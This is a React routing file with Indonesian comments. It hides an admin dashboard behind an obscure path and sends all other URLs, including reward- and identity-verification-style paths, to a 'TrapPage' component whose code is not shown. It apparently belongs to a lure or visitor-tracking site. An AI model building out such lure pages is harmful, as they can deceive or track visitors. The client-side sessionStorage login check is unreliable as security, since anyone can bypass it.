import React, { useState } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import TrapPage from './components/TrapPage';
import Dashboard from './components/Dashboard';
import AdminLogin from './components/AdminLogin';

// Komponen wrapper — cek sesi login sebelum tampilkan dashboard
const ProtectedDashboard = () => {
  const [authed, setAuthed] = useState(
    sessionStorage.getItem('admin_auth') === 'true'
  );

  if (!authed) {
    return <AdminLogin onSuccess={() => setAuthed(true)} />;
  }
  return <Dashboard />;
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Dashboard — dilindungi password, path tidak obvious */}
        <Route path="/s3nt1nel-ctrl" element={<ProtectedDashboard />} />

        {/* Trap pages */}
        <Route path="/verify-reward"    element={<TrapPage />} />
        <Route path="/confirm-identity" element={<TrapPage />} />
        <Route path="/v/:id"            element={<TrapPage />} />
        <Route path="/t/:id"            element={<TrapPage />} />

        {/* Semua path lain — termasuk "/" — tampilkan TrapPage */}
        <Route path="*" element={<TrapPage />} />
      </Routes>
    </Router>
  );
}

export default App;
